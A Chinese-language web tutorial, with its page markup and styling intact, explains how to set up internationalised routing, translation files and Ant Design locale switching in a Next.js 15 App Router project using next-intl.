                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>本文详细介绍如何在 Next.js 15 (App Router) 中使用 next-intl 实现完整的国际化方案，包括路由国际化、内容翻译和 UI 组件库（Ant Design）的国际化。</p>
<h2 data-id="heading-0">技术栈</h2>
<ul>
<li><strong>Next.js 15</strong> - React 框架</li>
<li><strong>next-intl</strong> - 国际化库</li>
<li><strong>Ant Design</strong> - UI 组件库</li>
<li><strong>TypeScript</strong> - 类型安全</li>
</ul>
<h2 data-id="heading-1">项目结构</h2>
<pre><code class="hljs language-ini" lang="ini">src/
├── app/
│   └── <span class="hljs-section">[locale]</span>/              <span class="hljs-comment"># 动态语言路由</span>
│       ├── layout.tsx         <span class="hljs-comment"># 布局组件</span>
│       ├── page.tsx           <span class="hljs-comment"># 页面组件</span>
│       └── AntdProvider.tsx   <span class="hljs-comment"># Ant Design 国际化配置</span>
├── i18n/
│   ├── routing.ts             <span class="hljs-comment"># 路由配置</span>
│   └── request.ts             <span class="hljs-comment"># 请求配置</span>
└── middleware.ts              <span class="hljs-comment"># 中间件</span>
messages/
├── en-US.json                 <span class="hljs-comment"># 英文翻译</span>
└── zh-CN.json                 <span class="hljs-comment"># 中文翻译</span>
</code></pre>
<h2 data-id="heading-2">实现步骤</h2>
<h3 data-id="heading-3">1. 安装依赖</h3>
<pre><code class="hljs language-bash" lang="bash">npm install next-intl
npm install antd @ant-design/nextjs-registry
</code></pre>
<h3 data-id="heading-4">2. 配置路由 (<code>src/i18n/routing.ts</code>)</h3>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">import</span> { defineRouting } <span class="hljs-keyword">from</span> <span class="hljs-string">'next-intl/routing'</span>;
<span class="hljs-keyword">import</span> { createNavigation } <span class="hljs-keyword">from</span> <span class="hljs-string">'next-intl/navigation'</span>;

<span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> routing = <span class="hljs-title function_">defineRouting</span>({
  <span class="hljs-attr">locales</span>: [<span class="hljs-string">'zh-CN'</span>, <span class="hljs-string">'en-US'</span>],
  <span class="hljs-attr">defaultLocale</span>: <span class="hljs-string">'en-US'</span>,
  <span class="hljs-attr">localePrefix</span>: <span class="hljs-string">'as-needed'</span>  <span class="hljs-comment">// 默认语言不显示前缀</span>
});

<span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> { <span class="hljs-title class_">Link</span>, redirect, usePathname, useRouter } =
  <span class="hljs-title function_">createNavigation</span>(routing);
</code></pre>
<p><strong>配置说明：</strong></p>
<ul>
<li><code>locales</code>: 支持的语言列表</li>
<li><code>defaultLocale</code>: 默认语言（英文）</li>
<li><code>localePrefix: 'as-needed'</code>: 默认语言 URL 不显示前缀</li>
</ul>
<p><strong>URL 结构：</strong></p>
<pre><code class="hljs language-bash" lang="bash">/              → 英文首页（默认语言，无前缀）
/about         → 英文关于页
/zh-CN         → 中文首页
/zh-CN/about   → 中文关于页
</code></pre>
<h3 data-id="heading-5">3. 配置中间件 (<code>src/middleware.ts</code>)</h3>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">import</span> createMiddleware <span class="hljs-keyword">from</span> <span class="hljs-string">'next-intl/middleware'</span>;
<span class="hljs-keyword">import</span> { routing } <span class="hljs-keyword">from</span> <span class="hljs-string">'./i18n/routing'</span>;

<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-title function_">createMiddleware</span>(routing);

<span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> config = {
  <span class="hljs-attr">matcher</span>: [<span class="hljs-string">'/'</span>, <span class="hljs-string">'/(zh-CN|en-US)/:path*'</span>, <span class="hljs-string">'/((?!api|_next|_vercel|.*\\..*).*)'</span>]
};
</code></pre>
<p><strong>中间件作用：</strong></p>
<ul>
<li>拦截所有请求</li>
<li>自动识别和处理语言路由</li>
<li>将无效语言重定向到默认语言</li>
<li>排除 API 路由和静态资源</li>
</ul>
<h3 data-id="heading-6">4. 配置请求处理 (<code>src/i18n/request.ts</code>)</h3>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">import</span> { getRequestConfig } <span class="hljs-keyword">from</span> <span class="hljs-string">'next-intl/server'</span>;
<span class="hljs-keyword">import</span> { routing } <span class="hljs-keyword">from</span> <span class="hljs-string">'./routing'</span>;

<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-title function_">getRequestConfig</span>(<span class="hljs-keyword">async</span> ({ requestLocale }) =&gt; {
  <span class="hljs-keyword">let</span> locale = <span class="hljs-keyword">await</span> requestLocale;

  <span class="hljs-keyword">if</span> (!locale || !routing.<span class="hljs-property">locales</span>.<span class="hljs-title function_">includes</span>(locale <span class="hljs-keyword">as</span> <span class="hljs-built_in">any</span>)) {
    locale = routing.<span class="hljs-property">defaultLocale</span>;
  }

  <span class="hljs-keyword">return</span> {
    locale,
    <span class="hljs-attr">messages</span>: (<span class="hljs-keyword">await</span> <span class="hljs-keyword">import</span>(<span class="hljs-string">`../../messages/<span class="hljs-subst">${locale}</span>.json`</span>)).<span class="hljs-property">default</span>
  };
});
</code></pre>
<p><strong>功能：</strong></p>
<ul>
<li>验证请求的语言是否合法</li>
<li>动态导入对应的翻译文件</li>
<li>不合法时回退到默认语言</li>
</ul>
<h3 data-id="heading-7">5. 配置 Next.js (<code>next.config.ts</code>)</h3>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">import</span> createNextIntlPlugin <span class="hljs-keyword">from</span> <span class="hljs-string">'next-intl/plugin'</span>;

<span class="hljs-keyword">const</span> withNextIntl = <span class="hljs-title function_">createNextIntlPlugin</span>(<span class="hljs-string">'./src/i18n/request.ts'</span>);

<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-title function_">withNextIntl</span>({
  <span class="hljs-comment">// 其他 Next.js 配置</span>
});
</code></pre>
<h3 data-id="heading-8">6. 创建布局组件 (<code>src/app/[locale]/layout.tsx</code>)</h3>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">import</span> <span class="hljs-keyword">type</span> { <span class="hljs-title class_">Metadata</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">"next"</span>;
<span class="hljs-keyword">import</span> { <span class="hljs-title class_">NextIntlClientProvider</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'next-intl'</span>;
<span class="hljs-keyword">import</span> { getMessages } <span class="hljs-keyword">from</span> <span class="hljs-string">'next-intl/server'</span>;
<span class="hljs-keyword">import</span> { notFound } <span class="hljs-keyword">from</span> <span class="hljs-string">'next/navigation'</span>;
<span class="hljs-keyword">import</span> { routing } <span class="hljs-keyword">from</span> <span class="hljs-string">'@/i18n/routing'</span>;
<span class="hljs-keyword">import</span> <span class="hljs-title class_">AntdProvider</span> <span class="hljs-keyword">from</span> <span class="hljs-string">'./AntdProvider'</span>;
<span class="hljs-keyword">import</span> <span class="hljs-string">"./globals.css"</span>;

<span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> <span class="hljs-attr">metadata</span>: <span class="hljs-title class_">Metadata</span> = {
  <span class="hljs-attr">title</span>: <span class="hljs-string">"Mogotech Web"</span>,
  <span class="hljs-attr">description</span>: <span class="hljs-string">"Next.js project with i18n support"</span>,
};

<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">LocaleLayout</span>(<span class="hljs-params">{
  children,
  params
}: {
  children: React.ReactNode;
  params: <span class="hljs-built_in">Promise</span>&lt;{ locale: <span class="hljs-built_in">string</span> }&gt;;
}</span>) {
  <span class="hljs-keyword">const</span> { locale } = <span class="hljs-keyword">await</span> params;

  <span class="hljs-comment">// 验证语言参数</span>
  <span class="hljs-keyword">if</span> (!routing.<span class="hljs-property">locales</span>.<span class="hljs-title function_">includes</span>(locale <span class="hljs-keyword">as</span> <span class="hljs-built_in">any</span>)) {
    <span class="hljs-title function_">notFound</span>();
  }

  <span class="hljs-comment">// 获取翻译消息</span>
  <span class="hljs-keyword">const</span> messages = <span class="hljs-keyword">await</span> <span class="hljs-title function_">getMessages</span>();

  <span class="hljs-keyword">return</span> (
    <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">{locale}</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">NextIntlClientProvider</span> <span class="hljs-attr">messages</span>=<span class="hljs-string">{messages}</span>&gt;</span>
          <span class="hljs-tag">&lt;<span class="hljs-name">AntdProvider</span> <span class="hljs-attr">locale</span>=<span class="hljs-string">{locale}</span>&gt;</span>
            {children}
          <span class="hljs-tag">&lt;/<span class="hljs-name">AntdProvider</span>&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">NextIntlClientProvider</span>&gt;</span>
      <span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span></span>
  );
}
</code></pre>
<p><strong>关键点：</strong></p>
<ul>
<li>使用 <code>[locale]</code> 动态路由捕获语言参数</li>
<li>验证语言合法性，不合法返回 404</li>
<li><code>NextIntlClientProvider</code> 提供翻译上下文</li>
<li><code>AntdProvider</code> 配置 Ant Design 国际化</li>
</ul>
<h3 data-id="heading-9">7. 配置 Ant Design 国际化 (<code>src/app/[locale]/AntdProvider.tsx</code>)</h3>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-string">'use client'</span>;

<span class="hljs-keyword">import</span> { <span class="hljs-title class_">ConfigProvider</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'antd'</span>;
<span class="hljs-keyword">import</span> zhCN <span class="hljs-keyword">from</span> <span class="hljs-string">'antd/locale/zh_CN'</span>;
<span class="hljs-keyword">import</span> enUS <span class="hljs-keyword">from</span> <span class="hljs-string">'antd/locale/en_US'</span>;

<span class="hljs-keyword">const</span> <span class="hljs-attr">locales</span>: <span class="hljs-title class_">Record</span>&lt;<span class="hljs-built_in">string</span>, <span class="hljs-built_in">any</span>&gt; = {
  <span class="hljs-string">'zh-CN'</span>: zhCN,
  <span class="hljs-string">'en-US'</span>: enUS,
};

<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">AntdProvider</span>(<span class="hljs-params">{
  children,
  locale,
}: {
  children: React.ReactNode;
  locale: <span class="hljs-built_in">string</span>;
}</span>) {
  <span class="hljs-keyword">return</span> (
    <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">ConfigProvider</span> <span class="hljs-attr">locale</span>=<span class="hljs-string">{locales[locale]</span> || <span class="hljs-attr">enUS</span>}&gt;</span>
      {children}
    <span class="hljs-tag">&lt;/<span class="hljs-name">ConfigProvider</span>&gt;</span></span>
  );
}
</code></pre>
<p><strong>作用：</strong></p>
<ul>
<li>配置 Ant Design 组件的语言</li>
<li>影响日期选择器、表单验证、分页等组件的文本</li>
</ul>
<h3 data-id="heading-10">8. 创建翻译文件</h3>
<p><strong>英文翻译 (<code>messages/en-US.json</code>)：</strong></p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"common"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"welcome"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"Welcome"</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"home"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"Home"</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"about"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"About"</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"contact"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"Contact Us"</span>
  <span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"home"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"title"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"Welcome to Mogotech"</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"description"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"This is a Next.js project with internationalization support"</span>
  <span class="hljs-punctuation">}</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<p><strong>中文翻译 (<code>messages/zh-CN.json</code>)：</strong></p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"common"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"welcome"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"欢迎"</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"home"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"首页"</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"about"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"关于"</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"contact"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"联系我们"</span>
  <span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"home"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"title"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"欢迎来到 Mogotech"</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"description"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"这是一个支持国际化的 Next.js 项目"</span>
  <span class="hljs-punctuation">}</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<p><strong>组织方式：</strong></p>
<ul>
<li>使用命名空间（<code>common</code>、<code>home</code>）组织翻译</li>
<li>支持嵌套结构</li>
<li>JSON 格式，易于维护</li>
</ul>
<h3 data-id="heading-11">9. 在页面中使用 (<code>src/app/[locale]/page.tsx</code>)</h3>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">import</span> { useTranslations } <span class="hljs-keyword">from</span> <span class="hljs-string">'next-intl'</span>;
<span class="hljs-keyword">import</span> { <span class="hljs-title class_">Link</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'@/i18n/routing'</span>;
<span class="hljs-keyword">import</span> { <span class="hljs-title class_">Button</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'antd'</span>;

<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">Home</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">const</span> t = <span class="hljs-title function_">useTranslations</span>(<span class="hljs-string">'home'</span>);
  <span class="hljs-keyword">const</span> tc = <span class="hljs-title function_">useTranslations</span>(<span class="hljs-string">'common'</span>);

  <span class="hljs-keyword">return</span> (
    <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">className</span>=<span class="hljs-string">"min-h-screen p-8"</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">nav</span> <span class="hljs-attr">className</span>=<span class="hljs-string">"mb-8 flex gap-4"</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">Link</span> <span class="hljs-attr">href</span>=<span class="hljs-string">"/"</span> <span class="hljs-attr">locale</span>=<span class="hljs-string">"zh-CN"</span>&gt;</span>
          <span class="hljs-tag">&lt;<span class="hljs-name">Button</span>&gt;</span>中文<span class="hljs-tag">&lt;/<span class="hljs-name">Button</span>&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">Link</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">Link</span> <span class="hljs-attr">href</span>=<span class="hljs-string">"/"</span> <span class="hljs-attr">locale</span>=<span class="hljs-string">"en-US"</span>&gt;</span>
          <span class="hljs-tag">&lt;<span class="hljs-name">Button</span>&gt;</span>English<span class="hljs-tag">&lt;/<span class="hljs-name">Button</span>&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">Link</span>&gt;</span>
      <span class="hljs-tag">&lt;/<span class="hljs-name">nav</span>&gt;</span>
      
      <span class="hljs-tag">&lt;<span class="hljs-name">main</span> <span class="hljs-attr">className</span>=<span class="hljs-string">"max-w-4xl mx-auto"</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">h1</span> <span class="hljs-attr">className</span>=<span class="hljs-string">"text-4xl font-bold mb-4"</span>&gt;</span>{t('title')}<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">p</span> <span class="hljs-attr">className</span>=<span class="hljs-string">"text-lg text-gray-600 mb-8"</span>&gt;</span>{t('description')}<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>
        
        <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">className</span>=<span class="hljs-string">"flex gap-4"</span>&gt;</span>
          <span class="hljs-tag">&lt;<span class="hljs-name">Button</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"primary"</span>&gt;</span>{tc('home')}<span class="hljs-tag">&lt;/<span class="hljs-name">Button</span>&gt;</span>
          <span class="hljs-tag">&lt;<span class="hljs-name">Button</span>&gt;</span>{tc('about')}<span class="hljs-tag">&lt;/<span class="hljs-name">Button</span>&gt;</span>
          <span class="hljs-tag">&lt;<span class="hljs-name">Button</span>&gt;</span>{tc('contact')}<span class="hljs-tag">&lt;/<span class="hljs-name">Button</span>&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
      <span class="hljs-tag">&lt;/<span class="hljs-name">main</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>
  );
}
</code></pre>
<p><strong>使用方式：</strong></p>
<ul>
<li><code>useTranslations('namespace')</code>: 获取指定命名空间的翻译函数</li>
<li><code>t('key')</code>: 获取翻译文本</li>
<li><code>Link</code> 组件: 使用国际化路由，自动处理语言前缀</li>
</ul>
<h2 data-id="heading-12">工作流程</h2>
<pre><code class="hljs language-bash" lang="bash">用户访问 /about
    ↓
middleware.ts 拦截请求
    ↓
识别语言为 en-US（默认）
    ↓
request.ts 加载 messages/en-US.json
    ↓
layout.tsx 接收 locale 和 messages
    ↓
NextIntlClientProvider 提供翻译上下文
    ↓
AntdProvider 配置 Ant Design 语言
    ↓
page.tsx 使用 useTranslations 获取翻译
    ↓
渲染英文内容
</code></pre>
<h2 data-id="heading-13">语言切换流程</h2>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// 用户点击语言切换按钮</span>
&lt;<span class="hljs-title class_">Link</span> href=<span class="hljs-string">"/"</span> locale=<span class="hljs-string">"zh-CN"</span>&gt;中文&lt;/<span class="hljs-title class_">Link</span>&gt;

<span class="hljs-comment">// Link 组件生成 URL: /zh-CN</span>
<span class="hljs-comment">// 页面跳转到 /zh-CN</span>
<span class="hljs-comment">// middleware 识别语言为 zh-CN</span>
<span class="hljs-comment">// 加载 messages/zh-CN.json</span>
<span class="hljs-comment">// 重新渲染页面，显示中文内容</span>
</code></pre>
<h2 data-id="heading-14">核心特性</h2>
<h3 data-id="heading-15">1. 路由国际化</h3>
<ul>
<li>URL 包含语言信息，SEO 友好</li>
<li>默认语言无前缀，URL 简洁</li>
<li>支持语言切换时保持当前路径</li>
</ul>
<h3 data-id="heading-16">2. 服务端渲染</h3>
<ul>
<li>翻译在服务端完成</li>
<li>首屏加载即显示正确语言</li>
<li>有利于 SEO</li>
</ul>
<h3 data-id="heading-17">3. 按需加载</h3>
<ul>
<li>翻译文件动态导入</li>
<li>减少初始包体积</li>
<li>提升加载性能</li>
</ul>
<h3 data-id="heading-18">4. 类型安全</h3>
<ul>
<li>TypeScript 支持</li>
<li>编译时检查翻译键</li>
<li>减少运行时错误</li>
</ul>
<h3 data-id="heading-19">5. UI 组件国际化</h3>
<ul>
<li>Ant Design 组件自动适配语言</li>
<li>日期、表单、分页等组件文本自动翻译</li>
</ul>
<h2 data-id="heading-20">最佳实践</h2>
<h3 data-id="heading-21">1. 翻译文件组织</h3>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"common"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
    <span class="hljs-comment">// 全局通用翻译</span>
  <span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"home"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
    <span class="hljs-comment">// 首页专用翻译</span>
  <span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"about"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
    <span class="hljs-comment">// 关于页专用翻译</span>
  <span class="hljs-punctuation">}</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<h3 data-id="heading-22">2. 使用命名空间</h3>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// 避免翻译键冲突</span>
<span class="hljs-keyword">const</span> t = <span class="hljs-title function_">useTranslations</span>(<span class="hljs-string">'home'</span>);
<span class="hljs-title function_">t</span>(<span class="hljs-string">'title'</span>)  <span class="hljs-comment">// home.title</span>

<span class="hljs-keyword">const</span> tc = <span class="hljs-title function_">useTranslations</span>(<span class="hljs-string">'common'</span>);
<span class="hljs-title function_">tc</span>(<span class="hljs-string">'title'</span>)  <span class="hljs-comment">// common.title</span>
</code></pre>
<h3 data-id="heading-23">3. 语言切换保持路径</h3>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// 在任何页面切换语言，保持当前路径</span>
&lt;<span class="hljs-title class_">Link</span> href={pathname} locale=<span class="hljs-string">"zh-CN"</span>&gt;中文&lt;/<span class="hljs-title class_">Link</span>&gt;
<span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">Link</span> <span class="hljs-attr">href</span>=<span class="hljs-string">{pathname}</span> <span class="hljs-attr">locale</span>=<span class="hljs-string">"en-US"</span>&gt;</span>English<span class="hljs-tag">&lt;/<span class="hljs-name">Link</span>&gt;</span></span>
</code></pre>
<h3 data-id="heading-24">4. 处理缺失翻译</h3>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// request.ts 中设置回退</span>
<span class="hljs-keyword">return</span> {
  locale,
  <span class="hljs-attr">messages</span>: (<span class="hljs-keyword">await</span> <span class="hljs-keyword">import</span>(<span class="hljs-string">`../../messages/<span class="hljs-subst">${locale}</span>.json`</span>)).<span class="hljs-property">default</span>,
  <span class="hljs-attr">defaultTranslationValues</span>: {
    <span class="hljs-comment">// 设置默认值</span>
  }
};
</code></pre>
<h2 data-id="heading-25">常见问题</h2>
<h3 data-id="heading-26">Q1: 如何添加新语言？</h3>
<ol>
<li>在 <code>routing.ts</code> 中添加语言代码</li>
<li>创建对应的翻译文件 <code>messages/ja-JP.json</code></li>
<li>在 <code>AntdProvider.tsx</code> 中添加 Ant Design 语言包</li>
<li>更新 middleware matcher</li>
</ol>
<h3 data-id="heading-27">Q2: 如何让所有语言都显示前缀？</h3>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// routing.ts</span>
<span class="hljs-attr">localePrefix</span>: <span class="hljs-string">'always'</span>  <span class="hljs-comment">// 改为 always</span>
</code></pre>
<h3 data-id="heading-28">Q3: 如何在服务端组件中使用翻译？</h3>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">import</span> { getTranslations } <span class="hljs-keyword">from</span> <span class="hljs-string">'next-intl/server'</span>;

<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">Page</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">const</span> t = <span class="hljs-keyword">await</span> <span class="hljs-title function_">getTranslations</span>(<span class="hljs-string">'home'</span>);
  <span class="hljs-keyword">return</span> <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>{t('title')}<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span></span>;
}
</code></pre>
<h3 data-id="heading-29">Q4: 如何根据用户浏览器语言自动跳转？</h3>
<p>middleware 会自动处理，基于 <code>Accept-Language</code> 请求头。</p>
<h2 data-id="heading-30">总结</h2>
<p>这套方案实现了：</p>
<ul>
<li>完整的路由国际化</li>
<li>服务端渲染支持</li>
<li>UI 组件库国际化</li>
<li>类型安全</li>
<li>SEO 友好</li>
<li>性能优化</li>
</ul>
<p>适用于需要多语言支持的 Next.js 项目，特别是面向国际用户的公开网站。</p>
<h2 data-id="heading-31">参考资源</h2>
<ul>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fnext-intl-docs.vercel.app%2F" target="_blank" title="https://next-intl-docs.vercel.app/" ref="nofollow noopener noreferrer">next-intl 官方文档</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fnextjs.org%2Fdocs%2Fapp%2Fbuilding-your-application%2Frouting%2Finternationalization" target="_blank" title="https://nextjs.org/docs/app/building-your-application/routing/internationalization" ref="nofollow noopener noreferrer">Next.js 国际化指南</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fant.design%2Fdocs%2Freact%2Fi18n" target="_blank" title="https://ant.design/docs/react/i18n" ref="nofollow noopener noreferrer">Ant Design 国际化</a></li>
